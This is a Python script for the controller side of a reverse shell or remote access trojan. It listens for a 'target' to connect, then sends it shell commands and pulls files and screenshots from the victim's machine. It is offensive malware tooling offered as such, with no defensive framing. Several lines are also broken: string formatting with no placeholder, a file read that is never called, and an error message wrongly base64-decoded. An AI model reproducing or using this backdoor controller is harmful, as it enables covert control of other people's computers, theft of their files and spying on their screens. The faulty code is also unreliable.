#!/usr/bin/python3

import socket
import json
import base64
import subprocess

def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode())

def reliable_recv():
	json_data = b""
	while True:
		try:
			chunk = target.recv(1024)
			if not chunk:
				break
			json_data += chunk
			return json.loads(json_data.decode())
		except ValueError:
			continue
def server():
	global sock
	global ip
	global target
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(("127.0.0.1" , 53467))
	sock.listen(5)
	print("Listening...")
	target, ip = sock.accept()
	print("Target connected")

count = 1

def shell():
	global count
	while True:
		command = input("~[*] Shell#: " % str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		elif  command[:8] == "download":
			with open(command[9:], "wb") as file:
				result = reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as file:
					reliable_send(base64.b64encode(file.read))
			except:
				failed ="failed to upload"
				reliable_send(base64.b64decode(failed)) 
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1
		else:
			result = reliable_recv()
			print(result)

server()
shell()
sock.close()
